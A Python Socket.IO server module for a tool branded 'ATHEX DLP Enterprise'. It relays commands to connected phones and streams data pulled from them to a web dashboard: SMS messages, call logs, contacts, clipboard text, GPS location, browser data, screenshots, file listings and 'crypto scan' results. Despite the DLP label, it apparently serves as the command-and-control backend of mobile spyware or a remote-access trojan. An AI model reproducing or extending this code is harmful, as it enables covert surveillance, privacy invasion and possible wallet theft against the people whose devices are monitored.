"""
ATHEX DLP Enterprise - Socket Manager
======================================
Handles Socket.IO events for real-time communication
between the web dashboard and the backend server.
"""

import json
import logging
import time
from datetime import datetime
from typing import Dict, Optional, Callable

logger = logging.getLogger(__name__)


class SocketManager:
    """
    Manages Socket.IO events for real-time dashboard updates.
    
    Features:
    - Client connection tracking
    - Event broadcasting
    - Room management
    - Real-time notifications
    - Dashboard data streaming
    - Command forwarding
    """
    
    def __init__(self, socketio=None):
        """
        Initialize Socket Manager.
        
        Args:
            socketio: Flask-SocketIO instance
        """
        self.socketio = socketio
        self.device_manager = None
        self.command_dispatcher = None
        
        # Connected dashboard clients
        self.clients: Dict[str, Dict] = {}
        
        # Statistics
        self.total_connections = 0
        self.total_events = 0
        self.start_time = time.time()
        
        # Event counters
        self.event_counts: Dict[str, int] = {}
        
        logger.info("SocketManager initialized")
    
    def init_app(self, socketio, device_manager=None, command_dispatcher=None):
        """
        Initialize with Flask-SocketIO and other components.
        
        Args:
            socketio: Flask-SocketIO instance
            device_manager: DeviceManager instance
            command_dispatcher: CommandDispatcher instance
        """
        self.socketio = socketio
        self.device_manager = device_manager
        self.command_dispatcher = command_dispatcher
        
        # Register event handlers
        self._register_events()
        
        logger.info("Socket.IO events registered")
    
    def _register_events(self):
        """Register all Socket.IO event handlers"""
        
        @self.socketio.on('connect')
        def handle_connect():
            """Handle dashboard client connection"""
            from flask import request
            from flask_socketio import emit
            
            client_id = request.sid
            self.clients[client_id] = {
                'connected_at': datetime.now().isoformat(),
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent', 'Unknown')
            }
            
            self.total_connections += 1
            
            logger.info(f"🔌 Dashboard connected: {client_id} ({request.remote_addr})")
            
            # Send initial data
            emit('connected', {
                'message': 'Connected to ATHEX DLP Server',
                'client_id': client_id,
                'server_version': '2.0.0',
                'timestamp': datetime.now().isoformat()
            })
            
            # Send current device list
            if self.device_manager:
                devices = [d.to_dict() for d in self.device_manager.get_online_devices()]
                emit('devices_update', {
                    'devices': devices,
                    'count': len(devices),
                    'online': self.device_manager.get_online_count(),
                    'total': self.device_manager.get_total_count()
                })
        
        @self.socketio.on('disconnect')
        def handle_disconnect():
            """Handle dashboard client disconnection"""
            from flask import request
            
            client_id = request.sid
            if client_id in self.clients:
                del self.clients[client_id]
            
            logger.info(f"🔌 Dashboard disconnected: {client_id}")
        
        @self.socketio.on('request_devices')
        def handle_request_devices():
            """Send current device list to client"""
            from flask_socketio import emit
            
            if self.device_manager:
                devices = [d.to_dict() for d in self.device_manager.get_all_devices()]
                emit('devices_update', {
                    'devices': devices,
                    'count': len(devices),
                    'online': self.device_manager.get_online_count(),
                    'total': self.device_manager.get_total_count(),
                    'timestamp': datetime.now().isoformat()
                })
        
        @self.socketio.on('request_device_detail')
        def handle_request_device_detail(data):
            """Send detailed device info"""
            from flask_socketio import emit
            
            session_id = data.get('session_id')
            
            if self.device_manager:
                device = self.device_manager.get_device(session_id)
                if device:
                    emit('device_detail', device.to_dict())
                else:
                    emit('error', {'message': 'Device not found'})
        
        @self.socketio.on('send_command')
        def handle_send_command(data):
            """Send command to a device"""
            from flask_socketio import emit
            
            session_id = data.get('session_id')
            command_type = data.get('command')
            params = data.get('params', {})
            
            if not session_id or not command_type:
                emit('error', {'message': 'Missing session_id or command'})
                return
            
            if self.command_dispatcher:
                # Map string to CommandType
                from .command_dispatcher import CommandType
                
                try:
                    cmd_type = CommandType(command_type)
                except ValueError:
                    emit('error', {'message': f'Unknown command: {command_type}'})
                    return
                
                command = self.command_dispatcher.dispatch(
                    command_type=cmd_type,
                    target_session=session_id,
                    params=params
                )
                
                if command:
                    emit('command_sent', command.to_dict())
                else:
                    emit('error', {'message': 'Failed to send command'})
        
        @self.socketio.on('request_stats')
        def handle_request_stats():
            """Send server statistics"""
            from flask_socketio import emit
            
            stats = {
                'timestamp': datetime.now().isoformat(),
                'uptime_seconds': time.time() - self.start_time,
                'dashboard_clients': len(self.clients)
            }
            
            if self.device_manager:
                stats['devices'] = self.device_manager.get_stats()
            
            if self.command_dispatcher:
                stats['commands'] = self.command_dispatcher.get_stats()
            
            emit('stats_update', stats)
        
        @self.socketio.on('request_notifications')
        def handle_request_notifications(data):
            """Request notifications from a device"""
            from flask_socketio import emit
            
            session_id = data.get('session_id')
            
            if self.command_dispatcher:
                from .command_dispatcher import CommandType
                
                command = self.command_dispatcher.dispatch(
                    command_type=CommandType.GET_NOTIFICATIONS,
                    target_session=session_id
                )
                
                if command:
                    emit('notification_request_sent', {
                        'session_id': session_id,
                        'command_id': command.command_id
                    })
        
        @self.socketio.on('request_file_listing')
        def handle_request_file_listing(data):
            """Request file listing from device"""
            from flask_socketio import emit
            
            session_id = data.get('session_id')
            path = data.get('path', '/sdcard/')
            
            if self.command_dispatcher:
                from .command_dispatcher import CommandType
                
                command = self.command_dispatcher.dispatch(
                    command_type=CommandType.LIST_FILES,
                    target_session=session_id,
                    params={'path': path}
                )
                
                if command:
                    emit('file_request_sent', {
                        'session_id': session_id,
                        'path': path,
                        'command_id': command.command_id
                    })
        
        logger.info(f"✅ {len(self.socketio.handlers)} Socket.IO events registered")
    
    # ============================================================
    # BROADCASTING METHODS
    # ============================================================
    
    def broadcast_notification(self, notification: Dict):
        """Broadcast notification to all dashboard clients"""
        self._emit_to_all('new_notification', notification)
        self._increment_event('notification')
    
    def broadcast_device_connected(self, device: Dict):
        """Broadcast device connected event"""
        self._emit_to_all('device_connected', device)
        self._increment_event('device_connected')
    
    def broadcast_device_disconnected(self, device: Dict):
        """Broadcast device disconnected event"""
        self._emit_to_all('device_disconnected', device)
        self._increment_event('device_disconnected')
    
    def broadcast_file_listing(self, session_id: str, files: list):
        """Broadcast file listing result"""
        self._emit_to_all('file_listing_update', {
            'session_id': session_id,
            'files': files,
            'timestamp': datetime.now().isoformat()
        })
        self._increment_event('file_listing')
    
    def broadcast_location_update(self, session_id: str, location: Dict):
        """Broadcast location update"""
        self._emit_to_all('location_update', {
            'session_id': session_id,
            'latitude': location.get('latitude'),
            'longitude': location.get('longitude'),
            'accuracy': location.get('accuracy'),
            'timestamp': datetime.now().isoformat()
        })
        self._increment_event('location')
    
    def broadcast_clipboard_update(self, session_id: str, text: str):
        """Broadcast clipboard update"""
        self._emit_to_all('clipboard_update', {
            'session_id': session_id,
            'text': text,
            'timestamp': datetime.now().isoformat()
        })
        self._increment_event('clipboard')
    
    def broadcast_command_result(self, command: Dict):
        """Broadcast command result"""
        self._emit_to_all('command_result', command)
        self._increment_event('command_result')
    
    def broadcast_alert(self, level: str, message: str):
        """Broadcast alert to all clients"""
        self._emit_to_all('alert', {
            'level': level,  # info, warning, error, success
            'message': message,
            'timestamp': datetime.now().isoformat()
        })
    
    def broadcast_terminal_log(self, log_type: str, message: str):
        """Broadcast terminal log entry"""
        self._emit_to_all('terminal_log', {
            'type': log_type,
            'message': message,
            'timestamp': datetime.now().isoformat()
        })
    
    def broadcast_contacts_data(self, session_id: str, contacts: list):
        """Broadcast contacts data"""
        self._emit_to_all('contacts_data', {
            'session_id': session_id,
            'contacts': contacts,
            'count': len(contacts),
            'timestamp': datetime.now().isoformat()
        })
    
    def broadcast_sms_data(self, session_id: str, messages: list):
        """Broadcast SMS data"""
        self._emit_to_all('sms_data', {
            'session_id': session_id,
            'messages': messages,
            'count': len(messages),
            'timestamp': datetime.now().isoformat()
        })
    
    def broadcast_call_logs(self, session_id: str, calls: list):
        """Broadcast call logs"""
        self._emit_to_all('call_logs', {
            'session_id': session_id,
            'calls': calls,
            'count': len(calls),
            'timestamp': datetime.now().isoformat()
        })
    
    def broadcast_apps_data(self, session_id: str, apps: list):
        """Broadcast installed apps data"""
        self._emit_to_all('apps_data', {
            'session_id': session_id,
            'apps': apps,
            'count': len(apps),
            'timestamp': datetime.now().isoformat()
        })
    
    def broadcast_wifi_data(self, session_id: str, networks: list):
        """Broadcast WiFi scan results"""
        self._emit_to_all('wifi_data', {
            'session_id': session_id,
            'networks': networks,
            'count': len(networks),
            'timestamp': datetime.now().isoformat()
        })
    
    def broadcast_browser_data(self, session_id: str, data: Dict):
        """Broadcast browser data"""
        self._emit_to_all('browser_data', {
            'session_id': session_id,
            'data': data,
            'timestamp': datetime.now().isoformat()
        })
    
    def broadcast_crypto_data(self, session_id: str, data: Dict):
        """Broadcast crypto scan results"""
        self._emit_to_all('crypto_data', {
            'session_id': session_id,
            'data': data,
            'timestamp': datetime.now().isoformat()
        })
    
    def broadcast_screenshot(self, session_id: str, image_base64: str):
        """Broadcast screenshot"""
        self._emit_to_all('screenshot_ready', {
            'session_id': session_id,
            'image': image_base64,
            'timestamp': datetime.now().isoformat()
        })
    
    # ============================================================
    # PRIVATE METHODS
    # ============================================================
    
    def _emit_to_all(self, event: str, data: Dict):
        """Emit event to all connected dashboard clients"""
        if self.socketio:
            try:
                self.socketio.emit(event, data)
                self.total_events += 1
            except Exception as e:
                logger.error(f"Emit error ({event}): {e}")
    
    def _emit_to_client(self, client_id: str, event: str, data: Dict):
        """Emit event to specific client"""
        if self.socketio:
            try:
                self.socketio.emit(event, data, room=client_id)
            except Exception as e:
                logger.error(f"Emit error to {client_id}: {e}")
    
    def _increment_event(self, event_name: str):
        """Increment event counter"""
        self.event_counts[event_name] = self.event_counts.get(event_name, 0) + 1
    
    # ============================================================
    # STATISTICS
    # ============================================================
    
    def get_stats(self) -> Dict:
        """Get socket manager statistics"""
        return {
            'dashboard_clients': len(self.clients),
            'total_connections': self.total_connections,
            'total_events': self.total_events,
            'events_by_type': self.event_counts,
            'uptime_seconds': time.time() - self.start_time
        }
    
    def get_client_list(self) -> list:
        """Get list of connected dashboard clients"""
        return [
            {
                'client_id': cid,
                'ip': info.get('ip', 'Unknown'),
                'connected_at': info.get('connected_at')
            }
            for cid, info in self.clients.items()
        ]
    
    def shutdown(self):
        """Clean shutdown"""
        logger.info(f"SocketManager shutting down ({len(self.clients)} clients)")
        self.clients.clear()


# ============================================================
# TEST
# ============================================================
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    manager = SocketManager()
    
    print("\n🔌 SocketManager ready")
    print("  Events will be registered when init_app() is called")
    print("  Requires Flask-SocketIO instance")